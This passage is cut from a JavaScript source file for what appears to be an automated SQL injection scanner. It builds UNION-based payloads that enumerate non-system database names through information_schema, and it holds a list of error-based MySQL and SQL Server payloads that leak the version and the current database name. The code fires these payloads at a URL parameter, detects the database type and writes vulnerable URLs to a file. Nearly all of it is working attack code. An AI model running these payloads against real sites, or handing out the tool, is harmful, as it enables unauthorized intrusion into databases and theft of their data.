                        dbInfo.type = this._detectDbType(responseText);
                        this.logger?.info(`Found version via pattern:`, dbInfo.version);
                    }
                }
            } catch (error) {
                this.logger?.debug(`UNION extraction failed for query: ${query}`, { error: error.message });
            }
        }
        
        // Step 4: If we have version but no database name, try to get database names
        if ((dbInfo.version || dbInfo.type) && !dbInfo.name) {
            const dbQueries = [
                `(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','performance_schema','mysql','sys'))`,
                `(SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','performance_schema','mysql','sys') LIMIT 0,1)`,
                `DATABASE()`
            ];
            
            for (const query of dbQueries) {
                try {
                    const testUrlObj = new URL(baseUrlObj);
                    const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
                    const columns = Array(columnCount).fill('NULL');
                    columns[dataColumn] = query;
                    const unionPayload = ` UNION SELECT ${columns.join(',')}-- -`;
                    testUrlObj.searchParams.set(param, negativeId + unionPayload);
                    
                    const response = await this._makeRequest(testUrlObj.toString());
                    
                    if (response.status === 200) {
                        // Look for database names (filter out system databases)
                        const dbNameMatch = response.data.match(/([a-zA-Z0-9_]+(?:,[a-zA-Z0-9_]+)*)/);
                        if (dbNameMatch && 
                            !dbNameMatch[1].includes('information_schema') && 
                            !dbNameMatch[1].includes('performance_schema') &&
                            !dbNameMatch[1].match(/^(NULL|null|undefined)$/)) {
                            dbInfo.databases = dbNameMatch[1].split(',').filter(db => 
                                db && !['information_schema', 'performance_schema', 'mysql', 'sys'].includes(db)
                            );
                            if (dbInfo.databases.length > 0) {
                                dbInfo.name = dbInfo.databases[0]; // Use first non-system database
                                this.logger?.info(`Found databases:`, dbInfo.databases);
                                break;
                            }
                        }
                    }
                } catch (error) {
                    // Continue
                }
            }
        }
        
        if (workingPayload) {
            this.logger?.info(`UNION extraction successful`, { 
                ...dbInfo, 
                columnCount: workingPayload.columnCount,
                dataColumn: workingPayload.dataColumn
            });
        }
    }
    
    /**
     * Helper to detect database type from version string or response
     */
    _detectDbType(text) {
        if (!text) return null;
        text = text.toLowerCase();
        
        if (text.includes('mysql')) return 'MySQL';
        if (text.includes('mariadb')) return 'MariaDB';
        if (text.includes('percona')) return 'MySQL';
        if (text.includes('microsoft sql')) return 'Microsoft SQL Server';
        if (text.includes('postgresql')) return 'PostgreSQL';
        if (text.includes('oracle')) return 'Oracle';
        if (text.includes('sqlite')) return 'SQLite';
        
        // Version patterns
        if (text.match(/^\d+\.\d+\.\d+/)) return 'MySQL'; // Default to MySQL for version-only strings
        
        return null;
    }

    /**
     * Attempt error-based extraction
     */
    async _attemptErrorBasedExtraction(baseUrlObj, param, dbInfo) {
        const originalValue = baseUrlObj.searchParams.get(param);
        
        const errorPayloads = [
            `' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))-- -`,
            `' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e))-- -`,
            `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -`,
            `' AND 1=CONVERT(int,@@version)-- -`,
            `' AND 1=CONVERT(int,DB_NAME())-- -`
        ];

        for (const payload of errorPayloads) {
            try {
                const testUrlObj = new URL(baseUrlObj);
                testUrlObj.searchParams.set(param, originalValue + payload);
                
                const response = await this._makeRequest(testUrlObj.toString());
                
                if (response.status === 200) {
                    const extracted = this._parseDbInfoFromText(response.data);
                    if (extracted.type || extracted.version || extracted.name) {
                        Object.assign(dbInfo, extracted);
                        this.logger?.info(`Successfully extracted DB info via error-based`, extracted);
                        return;
                    }
                }
            } catch (error) {
                this.logger?.debug(`Error-based extraction failed for payload: ${payload}`, { error: error.message });
            }
        }
    }

    /**
     * Make an HTTP request with proper error handling
     */
    async _makeRequest(url) {
        try {
            const response = await axios.get(url, {
                timeout: this.config.timeout,
                validateStatus: () => true,
                maxRedirects: 5
            });
            
            return {
                status: response.status,
                data: response.data ? response.data.toString() : '',
                headers: response.headers
            };
        } catch (error) {
            throw new Error(`Request failed: ${error.message}`);
        }
    }

    /**
     * Check if response contains generic error indicators
     */
    _hasGenericError(bodyText) {
        const errorPatterns = [
            /syntax error/i,
            /mysql_fetch/i,
            /ORA-\d+/i,
            /SQLiteException/i,
            /Warning.*mysql/i,
            /Fatal error/i
        ];
        
        return errorPatterns.some(pattern => pattern.test(bodyText));
    }

    /* Extract expected delay seconds from time-based payloads */
    _extractDelayFromPayload(payload) {
        const delayMatch = payload.match(/SLEEP\((\d+)\)|DELAY\s+'00:00:0(\d+)'/i);
        return delayMatch ? parseInt(delayMatch[1] || delayMatch[2]) : 5; // default 5s
    }

    /* Append vulnerable URL to output file – one per line */
    async _saveVulnerableUrl(url) {
        try {
            await appendToFile(this.config.outputFile, url + '\n', this.logger);
        } catch (error) {
            this.logger?.error('Failed to save vulnerable URL', { url, error: error.message });
        }
    }
}